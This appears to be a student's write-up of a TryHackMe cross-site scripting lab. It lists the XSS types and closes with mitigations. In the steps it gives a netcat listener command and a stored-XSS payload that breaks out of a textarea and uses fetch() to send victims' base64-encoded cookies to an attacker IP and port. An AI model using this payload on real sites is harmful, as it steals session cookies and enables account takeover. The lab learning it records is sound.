# Introduction of XSS (Cross-Site Scripting)

## Objective
To understand how XSS vulnerabilities works by injecting malicious JavaScript code into a web application in order for the user to execute the code.

## What I Learned
XSS is an vulnerability in which the malicious JavaScript is injected into the web application so that other users would actually execute the code unknowingly.

## Types of XSS
- Stored XSS - a bad script is saved in the database. For example, in the comments, forums, profiles, chat messages. And every user who visits this website injected with the scripts will get hit.
- Reflected XSS - a bad script is in URL/request and is reflected immediately.
- DOM-Based XSS - JavaScript in browser itself handles input unsafely and sometimes, no server is needed.
- Blind XSS - 

## Tools Used
- Web browser
- URL

## Steps I Took
- I created an account in a website in TryHackMe.
- Then, I created a ticket and wrote down in the form.
- I inspected the tickets sent and found out the <textarea> can be manipulated.
- In the terminal, I set up a listening server using Netcat, using command , 'nc -nlvp 9001' to creat a method of receiving the exfiltrated information.
- So I made another ticket and injected </textarea><script>fetch('http:IP:PORTNUMBER?cookie=' + btoa(document.cookie) );</script>
- After that, I viewed the terminal and get the cookie that I have exfiltrated.

## Key Takeaway
- XSS happens when attacker puts code inputs in a webpage (forms, comments etc) instead of safe text to cause the browser to store the malicious code.

## Reflection
- XSS can steal cookies, steal sessions tokens, change webpage content, redirect users, keylog typing, fake login forms and act as the victim user sometimes.
- Developers must implement several steps to avoid XSS such as using cookie protection, validate inputs, use safe framework features and use escape output (like converting special characters written to use codes to safer text).